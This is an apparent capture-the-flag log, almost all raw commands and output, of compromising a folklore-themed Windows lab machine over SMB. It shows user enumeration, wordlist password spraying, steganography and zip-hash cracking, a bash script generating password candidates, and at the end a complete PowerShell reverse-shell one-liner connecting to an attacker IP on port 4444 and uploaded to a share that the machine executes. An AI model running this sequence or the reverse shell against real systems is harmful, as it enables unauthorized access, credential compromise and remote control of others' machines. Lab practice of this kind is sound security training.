
┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ cat scan.txt
# Nmap 7.95 scan initiated Mon Sep 29 12:50:31 2025 as: /usr/lib/nmap/nmap --privileged -sS -p- --open --min-rate 5000 -n -Pn -oN scan.txt 192.168.69.9
Nmap scan report for 192.168.69.9
Host is up (0.00038s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
7680/tcp open  pando-pub
MAC Address: 08:00:27:EE:0F:0E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)



====================================================================================================================================================================================
┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ cat fullscan.txt 
# Nmap 7.95 scan initiated Mon Sep 29 12:52:29 2025 as: /usr/lib/nmap/nmap --privileged -sVC -p139,445,7680 -n -Pn -vvv -oN fullscan.txt 192.168.69.9
Nmap scan report for 192.168.69.9
Host is up, received arp-response (0.00030s latency).
Scanned at 2025-09-29 12:52:30 EDT for 82s

PORT     STATE SERVICE       REASON          VERSION
139/tcp  open  netbios-ssn   syn-ack ttl 128 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack ttl 128
7680/tcp open  pando-pub?    syn-ack ttl 128
MAC Address: 08:00:27:EE:0F:0E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 13964/tcp): CLEAN (Timeout)
|   Check 2 (port 51614/tcp): CLEAN (Timeout)
|   Check 3 (port 4220/udp): CLEAN (Timeout)
|   Check 4 (port 31029/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-09-29T16:53:13
|_  start_date: N/A
| nbstat: NetBIOS name: FOLCLORE, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:ee:0f:0e (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| Names:
|   FOLCLORE<00>         Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   FOLCLORE<20>         Flags: <unique><active>
| Statistics:
|   08:00:27:ee:0f:0e:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_clock-skew: 0s


====================================================================================================================================================================================
──(kali㉿kali)-[~/Documents/Folclore]
└─$ netexec smb 192.168.69.9
SMB         192.168.69.9    445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
                                                                                                                                                                                
====================================================================================================================================================================================

┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ netexec smb 192.168.69.9 -u "guest" -p ""   --rid-brute
SMB         192.168.69.9    445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB         192.168.69.9    445    FOLCLORE         [+] Folclore\guest: (Guest)
SMB         192.168.69.9    445    FOLCLORE         500: FOLCLORE\Administrador (SidTypeUser)
SMB         192.168.69.9    445    FOLCLORE         501: FOLCLORE\Invitado (SidTypeUser)
SMB         192.168.69.9    445    FOLCLORE         503: FOLCLORE\DefaultAccount (SidTypeUser)
SMB         192.168.69.9    445    FOLCLORE         504: FOLCLORE\WDAGUtilityAccount (SidTypeUser)
SMB         192.168.69.9    445    FOLCLORE         513: FOLCLORE\Ninguno (SidTypeGroup)
SMB         192.168.69.9    445    FOLCLORE         1001: FOLCLORE\Quetzalcoatl (SidTypeUser)
SMB         192.168.69.9    445    FOLCLORE         1003: FOLCLORE\El_charro_negro (SidTypeUser)
SMB         192.168.69.9    445    FOLCLORE         1004: FOLCLORE\Ix_Chel (SidTypeUser)
SMB         192.168.69.9    445    FOLCLORE         1005: FOLCLORE\Tlaloc (SidTypeUser)
SMB         192.168.69.9    445    FOLCLORE         1006: FOLCLORE\La_mulata_de_Cordoba (SidTypeUser)
SMB         192.168.69.9    445    FOLCLORE         1007: FOLCLORE\La_Catrina (SidTypeUser)
                                                                                                  







Administrador
Invitado
Quetzalcoatl
El_charro_negro
Ix_Chel
Tlaloc
La_mulata_de_Cordoba
La_Catrina





====================================================================================================================================================================================
                                                                                      
┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ smbclient -L //192.168.69.9 -N  

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Admin remota
        C$              Disk      Recurso predeterminado
        Dia de Muertos  Disk      Al final, todos somos polvo y hueso.
        IPC$            IPC       IPC remota
        Libertad        Disk      El secreto está en quien se atreve a buscarlo; sigue tu camino sin miedo.
        Lluvia          Disk      Presta atención, pues en esta imagen el camino se revela sólo a quien sabe escuchar el trueno
        Oro             Disk      ¿Buscas llegar a Quetzalcóatl? Aquí inicia tu camino.
        Santuario       Disk      El Refugio de Ixchel
        Viento          Disk      El viento sagrado ejecutará la tarea a su debido tiempo
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.69.9 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

====================================================================================================================================================================================




┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ netexec smb 192.168.69.9 -u "El_charro_negro" -p /usr/share/wordlists/rockyou.txt --continue-on-success --ignore-pw-decoding | grep "STATUS_PASSWORD_EXPIRED"   | grep "+"       
SMB                      192.168.69.9    445    FOLCLORE         [-] Folclore\El_charro_negro:abc123 STATUS_PASSWORD_EXPIRED 



┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ netexec smb 192.168.69.9 -u "El_charro_negro" -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding           
SMB         192.168.69.9    445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB         192.168.69.9    445    FOLCLORE         [-] Folclore\El_charro_negro:abc123 STATUS_PASSWORD_EXPIRED 



netexec smb 192.168.69.9 -u anonymous -p '' -M spider_plus -o DOWNLOAD_FLAG=true




====================================================================================================================================================================================





                                                                                                                                                                                
┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ netexec smb 192.168.69.9 -u "El_charro_negro" -p "cuenca12345"
SMB         192.168.69.9    445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB         192.168.69.9    445    FOLCLORE         [+] Folclore\El_charro_negro:cuenca12345 
                                                                                                                                                                                
  
====================================================================================================================================================================================


┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ netexec smb 192.168.69.9 -u El_charro_negro -p 'cuenca12345' --shares  
SMB         192.168.69.9    445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB         192.168.69.9    445    FOLCLORE         [+] Folclore\El_charro_negro:cuenca12345 
SMB         192.168.69.9    445    FOLCLORE         [*] Enumerated shares
SMB         192.168.69.9    445    FOLCLORE         Share           Permissions     Remark
SMB         192.168.69.9    445    FOLCLORE         -----           -----------     ------
SMB         192.168.69.9    445    FOLCLORE         ADMIN$                          Admin remota
SMB         192.168.69.9    445    FOLCLORE         C$                              Recurso predeterminado
SMB         192.168.69.9    445    FOLCLORE         Dia de Muertos                  Al final, todos somos polvo y hueso.
SMB         192.168.69.9    445    FOLCLORE         IPC$            READ            IPC remota
SMB         192.168.69.9    445    FOLCLORE         Libertad                        El secreto está en quien se atreve a buscarlo; sigue tu camino sin miedo.
SMB         192.168.69.9    445    FOLCLORE         Lluvia                          Presta atención, pues en esta imagen el camino se revela sólo a quien sabe escuchar el trueno                                                                                                                                                                               
SMB         192.168.69.9    445    FOLCLORE         Oro             READ,WRITE      ¿Buscas llegar a Quetzalcóatl? Aquí inicia tu camino.
SMB         192.168.69.9    445    FOLCLORE         Santuario                       El Refugio de Ixchel
SMB         192.168.69.9    445    FOLCLORE         Viento                          El viento sagrado ejecutará la tarea a su debido tiempo



====================================================================================================================================================================================



┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ smbclient  //192.168.69.9/Oro -U El_charro_negro                 
Password for [WORKGROUP\El_charro_negro]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Sep 29 17:56:39 2025
  ..                                  D        0  Mon Sep 29 17:56:39 2025
  El_Charro_Negro.jpeg                A    50061  Mon Jul 28 20:40:26 2025

                15581256 blocks of size 4096. 10762905 blocks available
smb: \> get El_Charro_Negro.jpeg 
getting file \El_Charro_Negro.jpeg of size 50061 as El_Charro_Negro.jpeg (118.7 KiloBytes/sec) (average 118.7 KiloBytes/sec)
smb: \> 




                                                                                                                                                                                
┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ exiftool El_Charro_Negro.jpeg                        
ExifTool Version Number         : 13.25
File Name                       : El_Charro_Negro.jpeg
Directory                       : .
File Size                       : 50 kB
File Modification Date/Time     : 2025:09:29 17:57:27-04:00
File Access Date/Time           : 2025:09:29 17:57:28-04:00
File Inode Change Date/Time     : 2025:09:29 17:57:27-04:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Big-endian (Motorola, MM)
Y Cb Cr Positioning             : Centered
Copyright                       : El camino es largo pero no complicado. Busca a Ix Chel; ella tiene la siguiente pista aqui tienes la clave: 4+9Ii1wK
Image Width                     : 736
Image Height                    : 981
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 736x981
Megapixels                      : 0.722
                                                                                                                                                                                
====================================================================================================================================================================================

                                                                                                                                                                                
┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ netexec smb 192.168.69.9 -u "Ix_Chel" -p "4+9Ii1wK" 
SMB         192.168.69.9    445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB         192.168.69.9    445    FOLCLORE         [-] Folclore\Ix_Chel:4+9Ii1wK STATUS_PASSWORD_EXPIRED 



┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ netexec smb 192.168.69.9 -u "Ix_Chel" -p "cuenca12345"
SMB         192.168.69.9    445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB         192.168.69.9    445    FOLCLORE         [+] Folclore\Ix_Chel:cuenca12345 

====================================================================================================================================================================================

┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ smbclient  //192.168.69.9/Santuario -U "Ix_Chel"  
Password for [WORKGROUP\Ix_Chel]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jul 28 23:50:38 2025
  ..                                  D        0  Mon Jul 28 23:50:38 2025
  La clave de Kukulcán.txt           A      573  Mon Jul 28 20:59:48 2025

                15581256 blocks of size 4096. 10741881 blocks available
smb: \> get La clave de Kukulcán.txt 
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \La
smb: \> get "La clave de Kukulcán.txt"
getting file \La clave de Kukulcán.txt of size 573 as La clave de Kukulcán.txt (279.8 KiloBytes/sec) (average 279.8 KiloBytes/sec)
smb: \> ls
  .                                   D        0  Mon Jul 28 23:50:38 2025
  ..                                  D        0  Mon Jul 28 23:50:38 2025
  La clave de Kukulcán.txt           A      573  Mon Jul 28 20:59:48 2025

                15581256 blocks of size 4096. 10740687 blocks available
smb: \> exit
                                                                                                                                                                                
                                                                                                                                                                     
┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ cat 'La clave de Kukulcán.txt' 
Recuerdo cuando conocí a Kukulcán, la serpiente emplumada que otros llaman Quetzalcóatl; su mirada guardaba el misterio del viento y la sabiduría, y con una sonrisa me confió que su clave más preciada tenía solo ocho caracteres, sencilla pero poderosa, como él mismo. Nuestros caminos se entrelazan: yo, guardiana de la luna y la vida; él, portador del cielo y el conocimiento, unidos bajo el manto eterno de las estrellas. Ahora, sigue adelante, porque Quetzalcóatl te espera. Continua buscando a Tláloc,te despejare el camino entregándote su clave: 677Kn$q."


====================================================================================================================================================================================


                                                                                                                                                                               
┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ netexec smb 192.168.69.9 -u usuarios.txt -p '677Kn$q' 
SMB         192.168.69.9    445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB         192.168.69.9    445    FOLCLORE         [-] Folclore\Tlaloc:677Kn$q STATUS_PASSWORD_EXPIRED 



                                                                                                                                                                                
┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ netexec smb 192.168.69.9 -u "Tlaloc" -p "cuenca12345"
SMB         192.168.69.9    445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB         192.168.69.9    445    FOLCLORE         [+] Folclore\Tlaloc:cuenca12345 


                                                                                                                                                                                
┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ netexec smb 192.168.69.9 -u "Tlaloc" -p "cuenca12345" --shares
SMB         192.168.69.9    445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB         192.168.69.9    445    FOLCLORE         [+] Folclore\Tlaloc:cuenca12345 
SMB         192.168.69.9    445    FOLCLORE         [*] Enumerated shares
SMB         192.168.69.9    445    FOLCLORE         Share           Permissions     Remark
SMB         192.168.69.9    445    FOLCLORE         -----           -----------     ------
SMB         192.168.69.9    445    FOLCLORE         ADMIN$                          Admin remota
SMB         192.168.69.9    445    FOLCLORE         C$                              Recurso predeterminado
SMB         192.168.69.9    445    FOLCLORE         Dia de Muertos                  Al final, todos somos polvo y hueso.
SMB         192.168.69.9    445    FOLCLORE         IPC$            READ            IPC remota
SMB         192.168.69.9    445    FOLCLORE         Libertad                        El secreto está en quien se atreve a buscarlo; sigue tu camino sin miedo.
SMB         192.168.69.9    445    FOLCLORE         Lluvia          READ,WRITE      Presta atención, pues en esta imagen el camino se revela sólo a quien sabe escuchar el trueno                                                                                                                                                                               
SMB         192.168.69.9    445    FOLCLORE         Oro                             ¿Buscas llegar a Quetzalcóatl? Aquí inicia tu camino.
SMB         192.168.69.9    445    FOLCLORE         Santuario                       El Refugio de Ixchel
SMB         192.168.69.9    445    FOLCLORE         Viento                          El viento sagrado ejecutará la tarea a su debido tiempo


┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ smbclient //192.168.69.9/Lluvia -U "Tlaloc"          
Password for [WORKGROUP\Tlaloc]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Oct  1 11:21:54 2025
  ..                                  D        0  Wed Oct  1 11:21:54 2025
  Tlaloc.jpg                          A   111216  Mon Jul 28 21:35:18 2025

                15581256 blocks of size 4096. 10714170 blocks available
smb: \> get Tlaloc.jpg 
getting file \Tlaloc.jpg of size 111216 as Tlaloc.jpg (18101.3 KiloBytes/sec) (average 18101.6 KiloBytes/sec)
smb: \> exit
                                                                                                                                                                                


                                                                                                                                                                                
┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ stegseek Tlaloc.jpg /usr/share/wordlists/rockyou.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "knight"
[i] Original filename: "Las primeras señales.txt".
[i] Extracting to "Tlaloc.jpg.out".

       
                                                                                                                                                                                
┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ cat Tlaloc.jpg.out 
He conseguido estos últimos dos caracteres para la clave de Kukulcán, la serpiente emplumada que llaman Quetzalcóatl: %/. Te los entrego para que completes tu búsqueda. Además, aquí tienes otra clave, aunque debo confesar que no recuerdo a quién pertenece exactamente: 45yD#k7. Confía en tu instinto para usarla sabiamente. 

====================================================================================================================================================================================


                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ netexec smb 192.168.69.9 -u usuarios.txt -p '45yD#k7'  
SMB         192.168.69.9    445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB         192.168.69.9    445    FOLCLORE         [-] Folclore\La_mulata_de_Cordoba:45yD#k7 STATUS_PASSWORD_EXPIRED 

                                                                                                                                                                                
┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ netexec smb 192.168.69.9 -u "La_mulata_de_Cordoba" -p "cuenca12345"
SMB         192.168.69.9    445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB         192.168.69.9    445    FOLCLORE         [+] Folclore\La_mulata_de_Cordoba:cuenca12345 
                                                                                                                                                                                
┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ netexec smb 192.168.69.9 -u "La_mulata_de_Cordoba" -p "cuenca12345" --shares
SMB         192.168.69.9    445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB         192.168.69.9    445    FOLCLORE         [+] Folclore\La_mulata_de_Cordoba:cuenca12345 
SMB         192.168.69.9    445    FOLCLORE         [*] Enumerated shares
SMB         192.168.69.9    445    FOLCLORE         Share           Permissions     Remark
SMB         192.168.69.9    445    FOLCLORE         -----           -----------     ------
SMB         192.168.69.9    445    FOLCLORE         ADMIN$                          Admin remota
SMB         192.168.69.9    445    FOLCLORE         C$                              Recurso predeterminado
SMB         192.168.69.9    445    FOLCLORE         Dia de Muertos                  Al final, todos somos polvo y hueso.
SMB         192.168.69.9    445    FOLCLORE         IPC$            READ            IPC remota
SMB         192.168.69.9    445    FOLCLORE         Libertad        READ,WRITE      El secreto está en quien se atreve a buscarlo; sigue tu camino sin miedo.
SMB         192.168.69.9    445    FOLCLORE         Lluvia                          Presta atención, pues en esta imagen el camino se revela sólo a quien sabe escuchar el trueno                                                                                                                                                                               
SMB         192.168.69.9    445    FOLCLORE         Oro                             ¿Buscas llegar a Quetzalcóatl? Aquí inicia tu camino.
SMB         192.168.69.9    445    FOLCLORE         Santuario                       El Refugio de Ixchel
SMB         192.168.69.9    445    FOLCLORE         Viento                          El viento sagrado ejecutará la tarea a su debido tiempo
                                                                                                                                                                                
┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ smbclient //192.168.69.9/Libertad -U "La_mulata_de_Cordoba"            
Password for [WORKGROUP\La_mulata_de_Cordoba]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Oct  1 11:32:04 2025
  ..                                  D        0  Wed Oct  1 11:32:04 2025
  Mi_amiga.txt                        A      169  Mon Jul 28 21:53:49 2025
  Pacto.zip                           A      432  Mon Jul 28 21:49:18 2025

                15581256 blocks of size 4096. 10696939 blocks available
smb: \> get Mi_amiga.txt 
getting file \Mi_amiga.txt of size 169 as Mi_amiga.txt (82.5 KiloBytes/sec) (average 82.5 KiloBytes/sec)
smb: \> get Pacto.zip 
getting file \Pacto.zip of size 432 as Pacto.zip (210.9 KiloBytes/sec) (average 146.7 KiloBytes/sec)
smb: \> exit

====================================================================================================================================================================================


┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ zip2john Pacto.zip > hash.txt 
                                                                                                                                                                                
┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ cat hash.txt    
Pacto.zip/Pacto.txt:$zip2$*0*1*0*73a70436da35cd56*a1ee*ee*a0aa0337582823725b07000d3dedca52bad2afc12d509556801a31a0f816b8fced5492ebf7a4341a11b3f9163af5987a4f40aebd67b9e1596063b73ead1d11ee9dc11b446dece47624c99f0c4b68f60d29bb92f2c0faa9d4d26f5f3d10a70a503f0776f9bca2feb7188898499528b2d9f5442c9050118f8af9494635b43e33d16def9b9ae1d84ac5eea447efdaa1f9eb1c8736dfad040501b75901d4ce4fa1870fa76a3df7b262d6f723956372a3248ad727c442a9591e37fa5be39b5194c0eebe41c4762a6bf57fbdd0931238535bc8e149b884a7396f19b4ac2abb74390fcea3ca28003cfca09cb7944c1bf043*2a0d5167c3efad03095b*$/zip2$:Pacto.txt:Pacto.zip:Pacto.zip
                                                                                                                                                                                
┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt  hash.txt  
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 238 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
celina           (Pacto.zip/Pacto.txt)     
1g 0:00:00:00 DONE (2025-10-01 11:36) 4.761g/s 39009p/s 39009c/s 39009C/s newzealand..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 



                                                                                                                                                                                
┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ cat Pacto.txt 
Has surcado sendas que pocos se atreven a cruzar, pero tu viaje no concluye todavía. Invocando mis artes prohibidas, logré hechizar a la serpiente emplumada y robarle apenas el inicio de su secreto: sólo tres caracteres fui capaz de obtener. Ahora los deposito en tus manos, pero escucha el viento y no olvides la deuda que ahora te ata a mi sombra: J9c.


====================================================================================================================================================================================


┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ cat Mi_amiga.txt   
Mi amiga ‘La Catrina’ me ha dejado su cuenta para que le ayude con algunos de sus trabajitos de vez en cuando. Escribiré la clave aquí para no olvidarla: 3nM93{S#
                                                                                                                                                                                
┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ netexec smb 192.168.69.9 -u "La_Catrina" -p '3nM93{S#'  
SMB         192.168.69.9    445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB         192.168.69.9    445    FOLCLORE         [-] Folclore\La_Catrina:3nM93{S# STATUS_PASSWORD_EXPIRED 
                                                                                                                                                                                
┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ netexec smb 192.168.69.9 -u "La_Catrina" -p 'cuenca12345' --shares
SMB         192.168.69.9    445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB         192.168.69.9    445    FOLCLORE         [+] Folclore\La_Catrina:cuenca12345 
SMB         192.168.69.9    445    FOLCLORE         [*] Enumerated shares
SMB         192.168.69.9    445    FOLCLORE         Share           Permissions     Remark
SMB         192.168.69.9    445    FOLCLORE         -----           -----------     ------
SMB         192.168.69.9    445    FOLCLORE         ADMIN$                          Admin remota
SMB         192.168.69.9    445    FOLCLORE         C$                              Recurso predeterminado
SMB         192.168.69.9    445    FOLCLORE         Dia de Muertos  READ,WRITE      Al final, todos somos polvo y hueso.
SMB         192.168.69.9    445    FOLCLORE         IPC$            READ            IPC remota
SMB         192.168.69.9    445    FOLCLORE         Libertad                        El secreto está en quien se atreve a buscarlo; sigue tu camino sin miedo.
SMB         192.168.69.9    445    FOLCLORE         Lluvia                          Presta atención, pues en esta imagen el camino se revela sólo a quien sabe escuchar el trueno                                                                                                                                                                               
SMB         192.168.69.9    445    FOLCLORE         Oro                             ¿Buscas llegar a Quetzalcóatl? Aquí inicia tu camino.
SMB         192.168.69.9    445    FOLCLORE         Santuario                       El Refugio de Ixchel
SMB         192.168.69.9    445    FOLCLORE         Viento                          El viento sagrado ejecutará la tarea a su debido tiempo
                                                                                                                                                                                
┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ smbclient //192.168.69.9/'Dia de Muertos' -U "La_Catrina"          
Password for [WORKGROUP\La_Catrina]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Oct  1 11:41:30 2025
  ..                                  D        0  Wed Oct  1 11:41:30 2025
  Ultimo_mensaje.txt                  A      278  Mon Jul 28 22:22:59 2025

                15581256 blocks of size 4096. 10676183 blocks available
smb: \> get Ultimo_mensaje.txt 
getting file \Ultimo_mensaje.txt of size 278 as Ultimo_mensaje.txt (90.5 KiloBytes/sec) (average 90.5 KiloBytes/sec)
smb: \> exit
                                                                                                                                                                                
┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ cat Ultimo_mensaje.txt 
Solo puedo darte el quinto carácter de su clave: ‘U’. Los demás caracteres que faltan deberás encontrarlos por tu cuenta, aunque no debe ser tan difícil; solo son números o letras. Confía en tu ingenio y no olvides que el misterio siempre se revela a quien persevera.

====================================================================================================================================================================================


# Caracteres Encontrados

J9c U %/




──(kali㉿kali)-[~/Documents/Folclore]
└─$ cat combinaciones.sh 
#!/bin/bash

# Script simple con números y letras minúsculas

caracteres="0123456789abcdefghijklmnñopqrstuvwxyzABCDEFGHIJKLMNÑOPQRSTUVWXYZ"

for ((i=0; i<62; i++)); do
    for ((j=0; j<62; j++)); do
        echo "J9c${caracteres:$i:1}U${caracteres:$j:1}%/"
    done
done




┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ ./combinaciones.sh > combinacionesClave.txt

====================================================================================================================================================================================


                                                                                                                                                                                
┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ netexec smb 192.168.69.9 -u 'Quetzalcoatl' -p combinacionesClave.txt | grep "+"
SMB                      192.168.69.9    445    FOLCLORE         [+] Folclore\Quetzalcoatl:J9c7U7%/ 
                                                                                                                                                                                


┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ netexec smb 192.168.69.9 -u 'Quetzalcoatl' -p 'J9c7U7%/' --shares
SMB         192.168.69.9    445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) 
SMB         192.168.69.9    445    FOLCLORE         [+] Folclore\Quetzalcoatl:J9c7U7%/ 
SMB         192.168.69.9    445    FOLCLORE         [*] Enumerated shares
SMB         192.168.69.9    445    FOLCLORE         Share           Permissions     Remark
SMB         192.168.69.9    445    FOLCLORE         -----           -----------     ------
SMB         192.168.69.9    445    FOLCLORE         ADMIN$                          Admin remota
SMB         192.168.69.9    445    FOLCLORE         C$                              Recurso predeterminado
SMB         192.168.69.9    445    FOLCLORE         Dia de Muertos                  Al final, todos somos polvo y hueso.
SMB         192.168.69.9    445    FOLCLORE         IPC$            READ            IPC remota
SMB         192.168.69.9    445    FOLCLORE         Libertad                        El secreto está en quien se atreve a buscarlo; sigue tu camino sin miedo.
SMB         192.168.69.9    445    FOLCLORE         Lluvia                          Presta atención, pues en esta imagen el camino se revela sólo a quien sabe escuchar el trueno                                                                                                                                                                               
SMB         192.168.69.9    445    FOLCLORE         Oro             READ            ¿Buscas llegar a Quetzalcóatl? Aquí inicia tu camino.
SMB         192.168.69.9    445    FOLCLORE         Santuario                       El Refugio de Ixchel
SMB         192.168.69.9    445    FOLCLORE         Viento          READ,WRITE      El viento sagrado ejecutará la tarea a su debido tiempo


┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ smbclient //192.168.69.9/Viento -U "Quetzalcoatl"
Password for [WORKGROUP\Quetzalcoatl]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Oct  1 12:18:05 2025
  ..                                  D        0  Wed Oct  1 12:18:05 2025
  Serpiente Emplumada.txt             A      432  Mon Jul 28 22:27:08 2025

                15581256 blocks of size 4096. 10674220 blocks available
smb: \> get "Serpiente Emplumada.txt"
getting file \Serpiente Emplumada.txt of size 432 as Serpiente Emplumada.txt (210.9 KiloBytes/sec) (average 210.9 KiloBytes/sec)
smb: \> exit




┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ cat Serpiente\ Emplumada.txt 
Has recorrido con valentía y sabiduría un sendero lleno de retos; te felicito, guerrero del destino.
Ahora, confía en mí, Quetzalcóatl, la serpiente emplumada, pues seré yo quien te otorgue el acceso necesario. 
Solo ejecutaré una vez aquel archivo PowerShell que decidas subir, para abrir el portal hacia lo que buscas. 
Que esta acción sea el puente que te lleve a la verdad escondida entre los vientos y las estrellas.                                                                                                                                                                                





====================================================================================================================================================================================

https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3

# Reverse PowerShell



┌──(kali㉿kali)-[~/Documents/Quokka]
└─$ cat shell.ps1 
# Nikhil SamratAshok Mittal: http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html

$client = New-Object System.Net.Sockets.TCPClient('192.168.69.3',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
                                                                                                                                                            


====================================================================================================================================================================================



┌──(kali㉿kali)-[~/Documents/Folclore]
└─$ smbclient //192.168.69.9/Viento -U "Quetzalcoatl"                
Password for [WORKGROUP\Quetzalcoatl]:
Try "help" to get a list of possible commands.
smb: \> put shell.ps1
putting file shell.ps1 as \shell.ps1 (610.3 kb/s) (average 610.4 kb/s)
smb: \> SMBecho failed (NT_STATUS_CONNECTION_RESET). The connection is disconnected now

                                                                                                                                                                                
┌──(kali㉿kali)-[~/Documents/Folclore]
